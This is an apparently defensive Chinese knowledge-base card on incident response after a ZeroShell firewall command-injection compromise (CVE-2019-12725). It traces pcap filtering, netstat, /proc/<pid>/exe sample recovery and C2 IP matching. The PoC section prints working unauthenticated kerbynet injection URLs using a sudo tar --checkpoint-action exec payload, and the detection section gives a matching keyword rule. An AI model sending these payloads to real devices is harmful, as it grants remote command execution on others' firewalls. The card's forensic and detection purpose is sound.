---
id: defense-incident-response-appliance-rce-pcap-to-proc-exe-sample
title: 防火墙类设备 RCE 后的取证链：从 pcap 里认出 kerbynet 注入 payload，再到设备上 netstat -n -p 找外联、用 /proc/<pid>/exe 定位 /tmp/.nginx 落地样本并提取 C2
type: scenario
domain: defense
path: defense/incident-response
technique: appliance-rce-pcap-payload-triage-to-proc-exe-sample
tags:
- incident-response
- forensics
- linux
- appliance
- pcap
- c2
- ioc
- proc-exe
- command-injection
cve:
- CVE-2019-12725
severity: medium
confidence: medium
status: verified
created: '2026-11-08'
updated: '2026-11-08'
verification:
  verified_by: verifier-T2-3W3
  verified_at: '2026-11-08T19:38:20+08:00'
  notes: 已对照原文核对；本次核对未读取图片；Wireshark 过滤 http.request.uri matches cgi-bin/kerbynet、x509type='%0A...%0A' payload 形态、netstat -n -p 取 PID 10449、ls -al /proc/10449/exe 得 /tmp/.nginx、xxd 后搜 202.115.89.103、/DB/_DB.001/flag 与 /Database/flag 均与正文一致；卡片把流程泛化为 cp /proc/<pid>/exe、strings 比对、/proc/net/tcp 等取证通法，属原步骤的合理外推而非原文逐字；CVE-2019-12725 由原文明确点名；
url: /docs/defense/incident-response/defense-incident-response-appliance-rce-pcap-to-proc-exe-sample/
draft: false
kb_aliases:
- ZeroShell 入侵取证
- 从流量定位 kerbynet payload
- netstat 找外联进程
- /proc/pid/exe 定位落地文件
- 设备 RCE 后样本溯源
- x509type 流量特征
---

## 一句话结论

设备型（防火墙/网关）被 Web 命令注入打穿后，取证不必从文件系统全盘翻：先在流量里按 `cgi-bin` 路径过滤认出注入 payload（`x509type='%0A<命令>%0A'` 这类「单引号 + 换行」特征），再到设备上用 `netstat -n -p` 找当前外联进程号，`ls -al /proc/<pid>/exe` 直接拿到进程对应的**已删除或隐藏路径**的样本文件（本例 `/tmp/.nginx`），下载后 `xxd`/`strings` 里搜前面得到的 C2 IP 即可闭环。

## 原理

- **流量里认注入比翻日志快**：`/cgi-bin/kerbynet?Action=x509view&Section=NoAuthREQ&User=&x509type=...` 中 `Section=NoAuthREQ` 表示免认证分支，参数里出现 `%0A`、`%27`、`tar`、`--checkpoint-action` 就是命令注入 payload。Wireshark 用 `http.request.uri matches "cgi-bin/kerbynet"` 或 `frame contains "<base64 片段>"` 过滤即可定位全部利用请求。
- **`netstat -n -p` 是「当前活着的证据」**：pcap 只证明打过，`netstat -n -p` 给出「此刻谁在往外连」，把 IP 与 PID 绑定，避免只看历史连接被已断开的会话误导。
- **`/proc/<pid>/exe` 是绕过文件名的捷径**：恶意样本常伪装成 `.nginx`、`.cache-*` 这类隐藏名或已被 `unlink`（运行中仍占 inode）。`ls -al /proc/<pid>/exe` 显示的软链目标即真实路径，即使目录里看不到该文件也能定位；`cat /proc/<pid>/exe > /tmp/sample` 或直接 `cp` 可把样本落地拷贝出来。
- **样本与流量互为印证**：从 `/tmp/.nginx` 里 `strings`/`xxd` 搜出前面 `netstat` 得到的 C2 IP，两条独立证据（网络侧 + 主机侧）互相确认，才算闭环，避免把正常业务的对外连接误判为 C2。
- **设备上的命令执行通道常可复用**：同一注入点既能当「取证通道」又能当「验证通道」，在无法登录 shell 的固件设备上尤其重要（本例用 `--checkpoint-action=exec='netstat -anp'` 的回显取进程号）。

## 触发条件

- 出事设备是 Web 管理型网络设备（防火墙/网关/路由器），且已确认或怀疑被命令注入利用。
- 有边界侧流量留存（pcap/HTTP 日志），能按 URI 或字符串做过滤。
- 攻击者仍在设备上留有运行中的进程（样本已落地并在外联），否则 `netstat` 与 `/proc/<pid>/exe` 会失去目标，需转为磁盘取证。

## 利用步骤

> 这里的「利用」指取证/处置动作，全程在被授权的主机上执行只读命令。

1. **流量过滤**：`http.request.uri matches "cgi-bin/kerbynet"`；命中后 `Follow > HTTP Stream` 看完整请求行，确认 payload 形如 `x509type='%0A...%0A'`；`frame contains "<base64>"` 可直击带外传数据的请求。请求体/参数里的 base64 段落取值后本地 `base64 -d` 还原攻击者命令。
2. **活跃外联**：`netstat -n -p`（或 `netstat -anp`）找 `ESTABLISHED` 的外部地址与 PID，记录「IP:PORT ↔ PID」。
3. **定位样本**：`ls -al /proc/<pid>/exe` 取真实路径；再 `ls -al /proc/<pid>/cwd`、`cat /proc/<pid>/cmdline`、`cat /proc/<pid>/maps` 补齐落地目录、启动参数与是否 memfd 运行。
4. **取回样本**：`cp /proc/<pid>/exe /tmp/sample.elf` 或 `cat /proc/<pid>/exe > /tmp/sample.elf`；有 Web 通道时用同一条注入点 `cat` 出内容再本地还原（会经过 xxd/base64 转码）。
5. **比对 IOC**：对样本 `strings`/`xxd | grep -i "<c2 ip>"`，与第 2 步的 IP 对照；同时看 `/etc/hosts` 是否被加了解析（内网域名劫持常用手法）。
6. **留存证据**：记录 payload 原文、IP:PID、`/proc/<pid>/exe` 输出、样本哈希；再按「先断外联再杀进程」的顺序处置，避免看门狗复活。

## PoC

```text
# 1. 流量侧：定位注入请求
http.request.uri matches "/cgi-bin/kerbynet"

# 命中样例（单引号 + 换行跳出 + sudo tar 白名单执行）
GET /cgi-bin/kerbynet?Action=x509view&Section=NoAuthREQ&User=&x509type='%0A/etc/sudo%20tar%20-cf%20/dev/null%20/dev/null%20--checkpoint=1%20--checkpoint-action=exec='ps%20-ef'%0A' HTTP/1.1

# 2-3. 主机侧：外联 → 进程 → 真实路径
netstat -n -p
ls -al /proc/10449/exe      # -> /tmp/.nginx

# 4. 取回样本
cp /proc/10449/exe /tmp/sample.elf

# 5. 用样本里的字符串与第 2 步 IP 互证
strings -a /tmp/sample.elf | grep -i "202.115.89.103"
```

设备无 shell 时，同一条注入点可当取证通道（把命令换成只读查询）：

```text
/cgi-bin/kerbynet?Action=x509view&Section=NoAuthREQ&User=&x509type=%27%0Anetstat -anp%0A%27
/cgi-bin/kerbynet?Action=x509view&Section=NoAuthREQ&User=&x509type=%27%0Als -al /proc/10449/exe%0A%27
```

## 变体与关联

- 注入点变体：不限于 kerbynet，任何设备 CGI（`/cgi-bin/luci/`、`/apply.cgi`、`/goform/*`）都可按「URI + `%0A`/`%27`/`;` 特征」过滤。
- 无 `netstat` 变体：用 `/proc/net/tcp`（十六进制 local/remote 地址）替代；无 `ps` 时遍历 `/proc/*/cmdline`。
- 样本已删除变体：`/proc/<pid>/exe` 仍可读（inode 未释放）；进程已退出则转为磁盘取证——查 `/tmp`、`/dev/shm`、`/var/run` 下隐藏文件与近期 mtime。
- 域名劫持变体：设备常被改 `/etc/hosts` 做内网域名劫持，取证时必查；DNS/443 外联若解析到内网 IP，说明已被做中间人。
- 关联：与「Linux 进程名伪装取证（comm/cmdline/exe 三源不一致）」互补——那张卡讲如何识破伪装，本卡讲如何由外联定位到 exe；与「C2 木马清除顺序」互补——本卡负责取证，那张负责处置顺序。

## 检测与防御

- 边界设备管理面不暴露在公网；`/cgi-bin/kerbynet` 类 CGI 的免认证分支（`Section=NoAuthREQ`）应在网关层直接拒绝。
- 保留 HTTP 访问日志与关键流量：检测规则可写「URI 含 `cgi-bin` 且参数含 `%0A`/`%27`/`%60`/`$(`, 或命令关键字 `tar`、`--checkpoint-action`、`netstat`、`curl`」。
- 主机侧监控 `/tmp`、`/dev/shm`、`/var/run` 下新建的可执行文件与 `.*` 隐藏文件；对 `ESTABLISHED` 外联做基线比对。
- 处置顺序：先封外联/断 C2 → 再停看门狗/守护脚本 → 杀进程 → 删落地文件与自启项 → 改凭据并升级固件；取证材料在杀进程前取完。
